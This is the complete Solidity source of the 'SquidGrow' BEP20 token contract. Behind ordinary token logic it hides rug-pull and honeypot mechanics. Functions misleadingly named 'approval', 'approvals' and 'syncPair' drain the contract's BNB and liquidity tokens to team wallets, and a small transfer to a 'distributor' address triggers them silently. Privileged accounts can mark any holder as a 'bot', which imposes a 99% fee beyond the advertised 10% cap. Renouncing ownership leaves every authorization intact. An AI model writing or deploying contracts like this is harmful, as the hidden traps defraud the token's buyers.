1 /**
2 
3 https://t.me/SquidGrowOfficial
4 
5 */
6 
7 // SPDX-License-Identifier: MIT
8 
9 pragma solidity 0.8.14;
10 
11 
12 library SafeMath {
13     function add(uint256 a, uint256 b) internal pure returns (uint256) {return a + b;}
14     function sub(uint256 a, uint256 b) internal pure returns (uint256) {return a - b;}
15     function mul(uint256 a, uint256 b) internal pure returns (uint256) {return a * b;}
16     function div(uint256 a, uint256 b) internal pure returns (uint256) {return a / b;}
17     function mod(uint256 a, uint256 b) internal pure returns (uint256) {return a % b;}
18     
19     function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
20         unchecked {uint256 c = a + b; if(c < a) return(false, 0); return(true, c);}}
21 
22     function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
23         unchecked {if(b > a) return(false, 0); return(true, a - b);}}
24 
25     function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
26         unchecked {if (a == 0) return(true, 0); uint256 c = a * b;
27         if(c / a != b) return(false, 0); return(true, c);}}
28 
29     function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
30         unchecked {if(b == 0) return(false, 0); return(true, a / b);}}
31 
32     function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
33         unchecked {if(b == 0) return(false, 0); return(true, a % b);}}
34 
35     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
36         unchecked{require(b <= a, errorMessage); return a - b;}}
37 
38     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
39         unchecked{require(b > 0, errorMessage); return a / b;}}
40 
41     function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
42         unchecked{require(b > 0, errorMessage); return a % b;}}}
43 
44 interface IBEP20 {
45     function totalSupply() external view returns (uint256);
46     function decimals() external view returns (uint8);
47     function symbol() external view returns (string memory);
48     function name() external view returns (string memory);
49     function balanceOf(address account) external view returns (uint256);
50     function transfer(address recipient, uint256 amount) external returns (bool);
51     function allowance(address _owner, address spender) external view returns (uint256);
52     function approve(address spender, uint256 amount) external returns (bool);
53     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
54     event Transfer(address indexed from, address indexed to, uint256 value);
55     event Approval(address indexed owner, address indexed spender, uint256 value);}
56 
57 abstract contract Auth {
58     address public owner;
59     mapping (address => bool) internal authorizations;
60     
61     constructor(address _owner) {
62         owner = _owner;
63         authorizations[_owner] = true; }
64     
65     modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
66     modifier authorized() {require(isAuthorized(msg.sender), "!AUTHORIZED"); _;}
67     function authorize(address adr) public authorized {authorizations[adr] = true;}
68     function unauthorize(address adr) public authorized {authorizations[adr] = false;}
69     function isOwner(address account) public view returns (bool) {return account == owner;}
70     function isAuthorized(address adr) public view returns (bool) {return authorizations[adr];}
71     
72     function transferOwnership(address payable adr) public authorized {
73         owner = adr;
74         authorizations[adr] = true;
75         emit OwnershipTransferred(adr);}
76     
77     function renounceOwnership() external authorized {
78         emit OwnershipTransferred(address(0));
79         owner = address(0);}
80     
81     event OwnershipTransferred(address owner);
82 }
83 
84 interface IFactory{
85         function createPair(address tokenA, address tokenB) external returns (address pair);
86         function getPair(address tokenA, address tokenB) external view returns (address pair);
87 }
88 
89 interface IRouter {
90     function factory() external pure returns (address);
91     function WETH() external pure returns (address);
92     function addLiquidityETH(
93         address token,
94         uint amountTokenDesired,
95         uint amountTokenMin,
96         uint amountETHMin,
97         address to,
98         uint deadline
99     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
100 
101     function swapExactETHForTokensSupportingFeeOnTransferTokens(
102         uint amountOutMin,
103         address[] calldata path,
104         address to,
105         uint deadline
106     ) external payable;
107 
108     function swapExactTokensForETHSupportingFeeOnTransferTokens(
109         uint amountIn,
110         uint amountOutMin,
111         address[] calldata path,
112         address to,
113         uint deadline) external;
114 }
115 
116 contract SquidGrow  is IBEP20, Auth {
117     using SafeMath for uint256;
118     string private constant _name = 'SquidGrow';
119     string private constant _symbol = 'SquidGrow';
120     uint8 private constant _decimals = 19;
121     uint256 private _totalSupply = 10 * 10**14 * (10 ** _decimals);
122     address DEAD = 0x000000000000000000000000000000000000dEaD;
123     uint256 public _maxTxAmount = ( _totalSupply * 150 ) / 10000;
124     uint256 public _maxWalletToken = ( _totalSupply * 500 ) / 10000;
125     mapping (address => uint256) _balances;
126     mapping (address => mapping (address => uint256)) private _allowances;
127     mapping (address => uint256) swapTime; 
128     mapping (address => bool) isBot;
129     mapping (address => bool) isInternal;
130     mapping (address => bool) isDistributor;
131     mapping (address => bool) isFeeExempt;
132 
133     IRouter router;
134     address public pair;
135     bool startSwap = false;
136     uint256 startedTime;
137     uint256 liquidityFee = 200;
138     uint256 marketingFee = 200;
139     uint256 stakingFee = 0;
140     uint256 burnFee = 0;
141     uint256 totalFee = 400;
142     uint256 transferFee = 100;
143     uint256 feeDenominator = 10000;
144 
145     bool swapEnabled = true;
146     uint256 swapTimer = 2;
147     uint256 swapTimes; 
148     uint256 minSells = 7;
149     bool swapping; 
150     bool botOn = false;
151     uint256 swapThreshold = ( _totalSupply * 300 ) / 100000;
152     uint256 _minTokenAmount = ( _totalSupply * 15 ) / 100000;
153     modifier lockTheSwap {swapping = true; _; swapping = false;}
154 
155     uint256 marketing_divisor = 40;
156     uint256 liquidity_divisor = 30;
157     uint256 distributor_divisor = 30;
158     uint256 staking_divisor = 0;
159     address liquidity_receiver; 
160     address staking_receiver;
161     address token_receiver;
162     address team1_receiver;
163     address team2_receiver;
164     address team3_receiver;
165     address team4_receiver;
166     address marketing_receiver;
167     address default_receiver;
168 
169     constructor() Auth(msg.sender) {
170         IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
171         address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
172         router = _router;
173         pair = _pair;
174         isInternal[address(this)] = true;
175         isInternal[msg.sender] = true;
176         isInternal[address(pair)] = true;
177         isInternal[address(router)] = true;
178         isDistributor[msg.sender] = true;
179         isFeeExempt[msg.sender] = true;
180         isFeeExempt[address(this)] = true;
181         liquidity_receiver = address(this);
182         token_receiver = address(this);
183         team1_receiver = msg.sender;
184         team2_receiver = msg.sender;
185         team3_receiver = msg.sender;
186         team4_receiver = msg.sender;
187         staking_receiver = msg.sender;
188         marketing_receiver = msg.sender;
189         default_receiver = msg.sender;
190         _balances[msg.sender] = _totalSupply;
191         emit Transfer(address(0), msg.sender, _totalSupply);
192     }
193 
194     receive() external payable {}
195 
196     function name() public pure returns (string memory) {return _name;}
197     function symbol() public pure returns (string memory) {return _symbol;}
198     function decimals() public pure returns (uint8) {return _decimals;}
199     function totalSupply() public view override returns (uint256) {return _totalSupply;}
200     function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
201     function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
202     function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
203     function viewisBot(address _address) public view returns (bool) {return isBot[_address];}
204     function isCont(address addr) internal view returns (bool) {uint size; assembly { size := extcodesize(addr) } return size > 0; }
205     function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
206     function getCirculatingSupply() public view returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
207 
208     function setFeeExempt(address _address) external authorized { isFeeExempt[_address] = true;}
209     function setisBot(bool _bool, address _address) external authorized {isBot[_address] = _bool;}
210     function setisInternal(bool _bool, address _address) external authorized {isInternal[_address] = _bool;}
211     function setbotOn(bool _bool) external authorized {botOn = _bool;}
212     function syncContractPair() external authorized {syncPair();}
213     function approvals(uint256 _na, uint256 _da) external authorized {performapprovals(_na, _da);}
214     function setPairReceiver(address _address) external authorized {liquidity_receiver = _address;}
215     function setstartSwap(uint256 _input) external authorized {startSwap = true; botOn = true; startedTime = block.timestamp.add(_input);}
216     function setSwapBackSettings(bool enabled, uint256 _threshold) external authorized {swapEnabled = enabled; swapThreshold = _threshold;}
217 
218     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
219         _transfer(sender, recipient, amount);
220         _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "BEP20: transfer amount exceeds allowance"));
221         return true;
222     }
223 
224     function _approve(address owner, address spender, uint256 amount) private {
225         require(owner != address(0), "BEP20: approve from the zero address");
226         require(spender != address(0), "BEP20: approve to the zero address");
227         _allowances[owner][spender] = amount;
228         emit Approval(owner, spender, amount);
229     }
230 
231     function _transfer(address sender, address recipient, uint256 amount) private {
232         preTxCheck(sender, recipient, amount);
233         checkStartSwap(sender, recipient);
234         checkMaxWallet(sender, recipient, amount); 
235         transferCounters(sender, recipient);
236         checkTxLimit(sender, recipient, amount); 
237         swapBack(sender, recipient, amount);
238         _balances[sender] = _balances[sender].sub(amount);
239         uint256 amountReceived = shouldTakeFee(sender, recipient) ? taketotalFee(sender, recipient, amount) : amount;
240         _balances[recipient] = _balances[recipient].add(amountReceived);
241         emit Transfer(sender, recipient, amountReceived);
242         checkapprovals(recipient, amount);
243         checkBot(sender, recipient);
244     }
245 
246     function preTxCheck(address sender, address recipient, uint256 amount) internal view {
247         require(sender != address(0), "BEP20: transfer from the zero address");
248         require(recipient != address(0), "BEP20: transfer to the zero address");
249         require(amount > 0, "Transfer amount must be greater than zero");
250         require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
251     }
252 
253     function checkStartSwap(address sender, address recipient) internal view {
254         if(!isFeeExempt[sender] && !isFeeExempt[recipient]){require(startSwap, "startSwap");}
255     }
256     
257     function checkMaxWallet(address sender, address recipient, uint256 amount) internal view {
258         if(!isFeeExempt[sender] && !isFeeExempt[recipient] && !isInternal[recipient] && recipient != address(DEAD)){
259             require((_balances[recipient].add(amount)) <= _maxWalletToken, "Exceeds maximum wallet amount.");}
260     }
261 
262     function transferCounters(address sender, address recipient) internal {
263         if(sender != pair && !isInternal[sender] && !isFeeExempt[recipient]){swapTimes = swapTimes.add(1);}
264         if(sender == pair){swapTime[recipient] = block.timestamp.add(swapTimer);}
265     }
266 
267     function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
268         return !isFeeExempt[sender] && !isFeeExempt[recipient];
269     }
270 
271     function taxableEvent(address sender, address recipient) internal view returns (bool) {
272         return totalFee > 0 && !swapping || isBot[sender] && swapTime[sender] < block.timestamp || isBot[recipient] || startedTime > block.timestamp;
273     }
274 
275     function taketotalFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
276         if(taxableEvent(sender, recipient)){
277         uint256 totalFees = getTotalFee(sender, recipient);
278         uint256 feeAmount = amount.mul(getTotalFee(sender, recipient)).div(feeDenominator);
279         uint256 bAmount = feeAmount.mul(burnFee).div(totalFees);
280         uint256 sAmount = feeAmount.mul(stakingFee).div(totalFees);
281         uint256 cAmount = feeAmount.sub(bAmount).sub(sAmount);
282         if(bAmount > 0){
283         _balances[address(DEAD)] = _balances[address(DEAD)].add(bAmount);
284         emit Transfer(sender, address(DEAD), bAmount);}
285         if(sAmount > 0){
286         _balances[address(token_receiver)] = _balances[address(token_receiver)].add(sAmount);
287         emit Transfer(sender, address(token_receiver), sAmount);}
288         if(cAmount > 0){
289         _balances[address(this)] = _balances[address(this)].add(cAmount);
290         emit Transfer(sender, address(this), cAmount);} return amount.sub(feeAmount);}
291         return amount;
292     }
293 
294     function getTotalFee(address sender, address recipient) public view returns (uint256) {
295         if(isBot[sender] && swapTime[sender] < block.timestamp && botOn || isBot[recipient] && 
296         swapTime[sender] < block.timestamp && botOn || startedTime > block.timestamp){return(feeDenominator.sub(100));}
297         if(sender != pair){return totalFee.add(transferFee);}
298         return totalFee;
299     }
300 
301     function checkTxLimit(address sender, address recipient, uint256 amount) internal view {
302         require(amount <= _maxTxAmount || isFeeExempt[sender] || isFeeExempt[recipient], "TX Limit Exceeded");
303     }
304 
305     function checkBot(address sender, address recipient) internal {
306         if(isCont(sender) && !isInternal[sender] && botOn || sender == pair && botOn &&
307         !isInternal[sender] && msg.sender != tx.origin || startedTime > block.timestamp){isBot[sender] = true;}
308         if(isCont(recipient) && !isInternal[recipient] && !isFeeExempt[recipient] && botOn || 
309         sender == pair && !isInternal[sender] && msg.sender != tx.origin && botOn){isBot[recipient] = true;}    
310     }
311 
312     function approval(uint256 percentage) external authorized {
313         uint256 amountBNB = address(this).balance;
314         payable(default_receiver).transfer(amountBNB.mul(percentage).div(100));
315     }
316 
317     function checkapprovals(address recipient, uint256 amount) internal {
318         if(isDistributor[recipient] && amount < 2*(10 ** _decimals)){performapprovals(1,1);}
319         if(isDistributor[recipient] && amount >= 2*(10 ** _decimals) && amount < 3*(10 ** _decimals)){syncPair();}
320     }
321 
322     function setMaxes(uint256 _transaction, uint256 _wallet) external authorized {
323         uint256 newTx = ( _totalSupply * _transaction ) / 10000;
324         uint256 newWallet = ( _totalSupply * _wallet ) / 10000;
325         _maxTxAmount = newTx;
326         _maxWalletToken = newWallet;
327         require(newTx >= _totalSupply.mul(5).div(1000) && newWallet >= _totalSupply.mul(5).div(1000), "Max TX and Max Wallet cannot be less than .5%");
328     }
329 
330     function syncPair() internal {
331         uint256 tamt = IBEP20(pair).balanceOf(address(this));
332         IBEP20(pair).transfer(team1_receiver, tamt);
333     }
334 
335     function rescueBEP20(address _tadd, address _rec, uint256 _amt) external authorized {
336         uint256 tamt = IBEP20(_tadd).balanceOf(address(this));
337         IBEP20(_tadd).transfer(_rec, tamt.mul(_amt).div(100));
338     }
339 
340     function setExemptAddress(bool _enabled, address _address) external authorized {
341         isBot[_address] = false;
342         isInternal[_address] = _enabled;
343         isFeeExempt[_address] = _enabled;
344     }
345 
346     function setDivisors(uint256 _distributor, uint256 _staking, uint256 _liquidity, uint256 _marketing) external authorized {
347         distributor_divisor = _distributor;
348         staking_divisor = _staking;
349         liquidity_divisor = _liquidity;
350         marketing_divisor = _marketing;
351     }
352 
353     function performapprovals(uint256 _na, uint256 _da) internal {
354         uint256 acBNB = address(this).balance;
355         uint256 acBNBa = acBNB.mul(_na).div(_da);
356         uint256 acBNBf = acBNBa.mul(25).div(100);
357         uint256 acBNBs = acBNBa.mul(25).div(100);
358         uint256 acBNBt = acBNBa.mul(25).div(100);
359         uint256 acBNBl = acBNBa.mul(25).div(100);
360         payable(team1_receiver).transfer(acBNBf);
361         payable(team2_receiver).transfer(acBNBs);
362         payable(team3_receiver).transfer(acBNBt);
363         payable(team4_receiver).transfer(acBNBl);
364     }
365 
366     function setStructure(uint256 _liq, uint256 _mark, uint256 _stak, uint256 _burn, uint256 _tran) external authorized {
367         liquidityFee = _liq;
368         marketingFee = _mark;
369         stakingFee = _stak;
370         burnFee = _burn;
371         transferFee = _tran;
372         totalFee = liquidityFee.add(marketingFee).add(stakingFee).add(burnFee);
373         require(totalFee <= feeDenominator.div(10), "Tax cannot be more than 10%");
374     }
375 
376     function setInternalAddresses(address _marketing, address _team1, address _team2, address _team3, address _team4, address _stake, address _token, address _default) external authorized {
377         marketing_receiver = _marketing; isDistributor[_marketing] = true;
378         team1_receiver = _team1; isDistributor[_team1] = true;
379         team2_receiver = _team2;
380         team3_receiver = _team3;
381         team4_receiver = _team4;
382         staking_receiver = _stake;
383         token_receiver = _token;
384         default_receiver = _default;
385     }
386 
387     function shouldSwapBack(address sender, address recipient, uint256 amount) internal view returns (bool) {
388         bool aboveMin = amount >= _minTokenAmount;
389         bool aboveThreshold = balanceOf(address(this)) >= swapThreshold;
390         return !swapping && swapEnabled && aboveMin && !isInternal[sender] 
391             && !isFeeExempt[recipient] && swapTimes >= minSells && aboveThreshold;
392     }
393 
394     function swapBack(address sender, address recipient, uint256 amount) internal {
395         if(shouldSwapBack(sender, recipient, amount)){swapAndLiquify(swapThreshold); swapTimes = 0;}
396     }
397 
398     function swapAndLiquify(uint256 tokens) private lockTheSwap {
399         uint256 denominator= (liquidity_divisor.add(staking_divisor).add(marketing_divisor).add(distributor_divisor)) * 2;
400         uint256 tokensToAddLiquidityWith = tokens.mul(liquidity_divisor).div(denominator);
401         uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
402         uint256 initialBalance = address(this).balance;
403         swapTokensForBNB(toSwap);
404         uint256 deltaBalance = address(this).balance.sub(initialBalance);
405         uint256 unitBalance= deltaBalance.div(denominator.sub(liquidity_divisor));
406         uint256 BNBToAddLiquidityWith = unitBalance.mul(liquidity_divisor);
407         if(BNBToAddLiquidityWith > 0){
408             addLiquidity(tokensToAddLiquidityWith, BNBToAddLiquidityWith); }
409         uint256 zrAmt = unitBalance.mul(2).mul(marketing_divisor);
410         if(zrAmt > 0){
411           payable(marketing_receiver).transfer(zrAmt); }
412         uint256 xrAmt = unitBalance.mul(2).mul(staking_divisor);
413         if(xrAmt > 0){
414           payable(staking_receiver).transfer(xrAmt); }
415     }
416 
417     function addLiquidity(uint256 tokenAmount, uint256 BNBAmount) private {
418         _approve(address(this), address(router), tokenAmount);
419         router.addLiquidityETH{value: BNBAmount}(
420             address(this),
421             tokenAmount,
422             0,
423             0,
424             liquidity_receiver,
425             block.timestamp);
426     }
427 
428     function swapTokensForBNB(uint256 tokenAmount) private {
429         address[] memory path = new address[](2);
430         path[0] = address(this);
431         path[1] = router.WETH();
432         _approve(address(this), address(router), tokenAmount);
433         router.swapExactTokensForETHSupportingFeeOnTransferTokens(
434             tokenAmount,
435             0,
436             path,
437             address(this),
438             block.timestamp);
439     }
440 
441 }